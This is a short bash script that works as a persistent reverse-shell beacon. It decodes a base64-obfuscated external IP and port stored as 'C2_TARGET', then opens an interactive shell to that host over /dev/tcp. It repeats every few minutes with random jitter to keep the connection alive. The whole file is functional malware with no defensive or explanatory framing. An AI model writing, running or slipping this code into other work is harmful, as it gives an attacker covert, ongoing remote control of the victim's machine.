#!/bin/bash

C2_TARGET="NzcuOTAuMTQuMTU3OjE5ODY="

while true; do
  
  if ping -c 1 8.8.8.8 &> /dev/null; then
    
    DECODED_TARGET=$(echo "$C2_TARGET" | base64 -d)
    IP=$(echo "$DECODED_TARGET" | cut -d ':' -f 1)
    PORT=$(echo "$DECODED_TARGET" | cut -d ':' -f 2)

    bash -i >& /dev/tcp/$IP/$PORT 0>&1
    
  fi
  
  JITTER=$(shuf -i 0-120 -n 1)
  SLEEP_TIME=$((300 + JITTER))
  sleep $SLEEP_TIME

done
